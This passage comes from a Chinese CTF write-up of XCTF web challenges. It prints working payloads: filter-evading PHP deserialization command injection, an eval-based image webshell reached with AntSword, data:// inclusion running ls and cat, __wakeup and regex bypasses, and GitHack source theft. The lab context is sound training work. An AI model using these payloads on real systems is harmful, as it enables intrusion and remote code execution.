invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//但是我们想起来之前有一段对输入数组的过滤，其中就有ls，那么我们应该写为</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s&#x27;</span>));<span class="hljs-comment">//使用反写杠绕过过滤</span><br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</span><br></code></pre></td></tr></table></figure><p><strong>注意用POST参数传入</strong></p><p>那么我得到回显：<code>array(2) &#123; [0]=&gt; string(12) &quot;flag_1s_here&quot; [1]=&gt; string(9) &quot;index.php&quot; &#125;</code></p><p>说明index.php同级目录下还有一个<code>flag_1s_here</code>文件，没有后缀的话，可能时目录，编写shell，继续执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l\s$&#123;IFS&#125;-l$&#123;IFS&#125;fl\ag_1s_here&#x27;</span>));<span class="hljs-comment">//注意flag和空格也被过滤掉，分别用反斜杠和$&#123;IFS&#125;绕过</span><br>    <br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozMDoibFxzJHtJRlN9LWwke0lGU31mbFxhZ18xc19oZXJlIjt9fQ==</span><br></code></pre></td></tr></table></figure><p>回显：<code>array(2) &#123; [0]=&gt; string(7) &quot;total 4&quot; [1]=&gt; string(64) &quot;-rwxr-xr-x 1 root root 53 Nov 9 13:21 flag_831b69012c67b35f.php&quot; &#125;</code></p><p>flag应该就在<code>flag_831b69012c67b35f.php</code>里了</p><p><strong>因为<code>/</code>被过滤掉了，所以将字符串转为8进制，正常的字符串应该这样写</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;cat /flag_1s_here/flag_831b69012c67b35f.php&quot;)&#x27;</span>));<br></code></pre></td></tr></table></figure><p>那么转为8进制则为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&#x27;ping&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</span><br></code></pre></td></tr></table></figure><p>最后访问即可得到flag：<code>cyberpeace&#123;48a58397b3c434b2436426a5c3479d12&#125;</code></p><h4 id="9-upload1"><a href="#9-upload1" class="headerlink" title="9_upload1"></a>9_upload1</h4><h5 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h5><p>文件上传题，检查网页源码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) &#123;  </span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;  </span><br><span class="language-javascript">    <span class="hljs-keyword">while</span> (i--) &#123;  </span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>[i] === obj) &#123;  </span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">upfile = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;upfile&quot;</span>);</span><br><span class="language-javascript">submit = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;submit&quot;</span>);</span><br><span class="language-javascript">name = upfile.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">ext = name.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.+\./</span>,<span class="hljs-string">&#x27;&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>].<span class="hljs-title function_">contains</span>(ext))&#123;</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;请选择一张图片文件上传!&#x27;</span>);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h5><ul><li>本题JS绕过：修改上传文件后缀</li></ul><h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>文件上传题，想办法上传webshell，很明显前端有一个JS过滤，有两种办法，一种是在网页元素里删除JS后上传，另一种是上传图片🐎，我这里选择上传图片🐎。</p><p>编写一个图片🐎b.jpg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>bypass前端后通过BP抓包修改</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_2.jpg"></p><p>回显：<code>upload success : upload/1667464623.b.php</code></p><p>通过蚁剑连接：<code>http://61.147.171.105:50598/upload/1667464623.b.php</code>   密码为：<code>cmd</code></p><p>找到flag</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_1.jpg"></p><h4 id="10-文件包含-泰山杯"><a href="#10-文件包含-泰山杯" class="headerlink" title="10_文件包含 泰山杯"></a>10_文件包含 泰山杯</h4><h5 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h5><p>文件包含题，进入直接一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h5><p>- </p><h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p>很明显，要提交一个filename参数进去。</p><p>首先，随便提交一个payload，<code>filename=flag.php</code></p><p>有回显：<code>you have use the right usage , but error method</code></p><p>然后尝试一下php伪协议，payload：<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>有回显：<code>do not hack!</code>，说明是有过滤的。继续构造payload<code>filename=php://filter/read</code>，还是被过滤，说明是read被过滤掉了,同样的发现base64被过滤。</p><p>尝试后发现<code>convert.iconv.</code>未被过滤，那么可以使用BP对iconv中的两个字段爆破，使用提前编写好的字典。</p><p><strong>将<code>.iconv</code>的两个可选参数标为payload，并且选择<code>Cluster bomb</code>模式，设置好字典为准备好的.txt文件。爆破出来选择最长的response查看。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_3.jpg"></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_2.jpg"></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_1.jpg"></p><h4 id="11"><a href="#11" class="headerlink" title="11_"></a>11_</h4><h5 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h5><p>直接可以看到代码，检查网页源码也是一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><h5 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP反序列化编写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化数组，a是数组的意思</span><br>a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;4444&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;&#125;<br><span class="hljs-comment">//反序列化对象，O是对象的意思</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fall&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>__wakeup函数的bypass：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</strong></p></li></ul><h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>很显然只是显示了部分代码，只有给出的code可以操作，那么传一个code参数上去</p><p><code>code=111</code>,回显<code>you should not type an integer</code>，告诉我们不传整型，且说明code变量是可用的。</p><p>这是一个反序列化的问题。</p><p>反序列化构造：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>，这样行不通，会调用wakeup函数</p><p>利用PHP漏洞：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，</p><p>传入：<code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>回显：<code>the answer is : cyberpeace&#123;475ed74daf373a5a3a3fe01821af26e4&#125;</code></p><h4 id="12-Web-php-include-CTF"><a href="#12-Web-php-include-CTF" class="headerlink" title="12_Web_php_include_CTF"></a>12_Web_php_include_CTF</h4><h5 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP函数——<strong>strstr</strong>：搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p></li><li><p>PHP函数——<strong>str_replace</strong>：以其他字符替换字符串中的一些字符</p></li><li><h5 id="PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On"><a href="#PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On" class="headerlink" title="&#x3D;&#x3D;PHP伪协议：data:&#x2F;&#x2F;&#x3D;&#x3D;:类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen&#x3D;On，allow_url_include&#x3D;On"></a>&#x3D;&#x3D;<strong>PHP伪协议：data:&#x2F;&#x2F;</strong>&#x3D;&#x3D;:类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen&#x3D;On，allow_url_include&#x3D;On</h5></li><li><p>var_dump用于显示字符串</p></li></ul><h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>题目的意思很明显，我们要传一个GET类型的page参数上去，然后其会替换page里面的php:&#x2F;&#x2F;为空，防止我们显示文件内容。那么我们使用data:&#x2F;&#x2F;就好了。</p><p>首先构造payload:<code>?page=data://text/plain,&lt;?php exec(&#39;ls&#39;,$result);var_dump($result);?&gt;</code></p><p>获得如下回显：</p><p><code>array(3) &#123; [0]=&gt; string(18) &quot;fl4gisisish3r3.php&quot; [1]=&gt; string(9) &quot;index.php&quot; [2]=&gt; string(11) &quot;phpinfo.php&quot; &#125;</code></p><p><code>data://text/plain,&lt;?php echo $page?&gt;</code></p><p>很显然，我们的flag应该在<code>fl4gisisish3r3.php</code>文件里，那么我们cat一下文件里的内容就行了。</p><p>再构造payload：<code>?page=data://text/plain,&lt;?php exec(&#39;cat fl4gisisish3r3.php&#39;,$result);var_dump($result);?&gt;</code></p><p>获得如下回显：<code>array(3) &#123; [0]=&gt; string(5) &quot; string(50) &quot;$flag=&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;;&quot; [2]=&gt; string(2) &quot;?&gt;&quot; &#125;</code>，找到flag.</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/Web_php_include_CTF_1.jpg"></p><p>ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p><h4 id="13-Web-php-unserialize（题解未写完）"><a href="#13-Web-php-unserialize（题解未写完）" class="headerlink" title="13_Web_php_unserialize（题解未写完）"></a>13_Web_php_unserialize（题解未写完）</h4><h5 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h5><p>进去一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h5><ul><li>wakeup函数的绕过方法</li><li>O:+6绕过对O的正则匹配</li><li><strong>字符逃逸问题</strong></li></ul><h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>反序列化题，注意到<code>__destruct里有一个highlight_file</code>，这里就是出flag的地方。</p><p>显然，题目已经告诉我们secret在fl4g.php里，我们不妨先想办法去看看再说，</p><p>上传一个GET参数var，首先会被base64解码，然后会被正则过滤关键字，这里需要绕过，然后就被反序列化了，开始调用一个<code>wakeup</code>函数，会判断file参数是否是index，不是则置为index，这里也需要绕过，总共两个绕过点。</p><p>wakeup函数很好绕过，关键是正则匹配，<code>/[oc]:\d+:/</code>，这里的意思是匹配<code>o:数字:</code>，所以我们序列化中的<code>o:4</code>，就需要改一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;1:&#x27;</span>,<span class="hljs-string">&#x27;2:&#x27;</span>,<span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">echo</span> base64-<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-comment">//O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure><p>payload就为<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h4 id="14-MFW（git泄露）"><a href="#14-MFW（git泄露）" class="headerlink" title="14_MFW（git泄露）"></a>14_MFW（git泄露）</h4><h5 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h5><p>进去是一个个人网站的样子。跳转到About页面时，出现：</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_1.jpg"></p><p>使用了Git，说明开发者使用Git进行版本控制，很可能会存在Git引起的文件泄露问题。</p><h5 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>Git引起的文件泄露</p></li><li><p>PHP函数：str_pos:</p></li><li><p><strong>PHP函数：assert:</strong></p><ul><li><p>书写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP5,7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> = ?): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//PHP7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> = ?): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure></li><li><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert() 当做 PHP 代码来执行</strong>。如果传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的assert_options处理函数时，条件会转换为字符串，而布尔值 <strong><code>false</code></strong> 会被转换成空字符串</p></li></ul></li><li></li></ul><h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><p>可能是Git泄露，尝试在浏览器访问：<code>/.git/</code>，结果出现了回显，说明猜测正确。我们使用git hack获取服务器上用git管理的文件</p><p>首先在命令行中进入githack目录下，使用<code>python GitHack.py http://61.147.171.105:56499/.git/</code>，之后会在git hack目录下生成获取到的文件的文件夹。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_2.jpg">  </p><p>获得的index.php代码如下：省略html部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><span 